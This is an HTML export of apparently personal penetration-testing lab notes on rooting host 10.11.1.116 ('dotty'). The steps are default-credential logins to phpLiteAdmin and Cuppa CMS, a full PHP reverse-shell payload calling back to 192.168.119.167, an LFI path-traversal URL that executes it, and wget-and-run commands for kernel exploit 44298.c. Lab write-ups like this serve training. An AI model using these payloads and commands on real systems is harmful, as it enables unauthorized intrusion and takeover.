<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.11.1.116 dotty rooted</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.11.1.116 dotty rooted</h1><br/>Nmap showed that port 80 was the only truly juicy port.<br />dir busting gave me the directories db and administrator.<br /><br />db led me to phpLiteAdmin, which I was able to log onto via default creds (admin)<br />phpLiteAdminv1.9.3 is vulnerable to a php upload and execution normally, but I could only upload the php files. (The files were being uploaded to a non-standard directory)<br /><br />administrator led me to Cuppa CMS  which is vulnerable to a LFI vulnerability. (Cuppa default creds login admin:admin<br />I uploaded a php rev shell via phpLiteAdmin and then executed it via the LFI on Cuppa CMS<br /><br />once I had a shell uname -a showed me that the machine was      4.4.0-116-generic<br />searchsploit told me that 44298.c would do the trick! (kernel exploit)<br />    gcc 44298.c -o 44298.exe<br />    wget <a href="http://192.168.119.167:80/44298.exe">http://192.168.119.167:80/44298.exe</a><br />    chmod +x 44298.exe<br />    ./44298.exe<br />    whoami<br />    root!<br />    <br /><br /><br />In order to leverage the phpLiteAdmin v1.9.3 file upload I needed to...<br />    create new database (yeet.php) &gt; create new table (yeet) number of fields (1) &gt; field = yeet type=TEXT defaultfalue=&lt;?php $sock=fsockopen(&quot;192.168.119.167&quot;,443);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes); ?&gt;<br />    <a href="https://www.youtube.com/watch?v=G1i5oWblx9Q">https://www.youtube.com/watch?v=G1i5oWblx9Q</a>    <br />    <br />In Cuppa I was able to execute it by navigating to http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../usr/local/databases/yeet.php<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />f96fa30b9bc142e9d5c3649b055c28de<br /></div></body></html>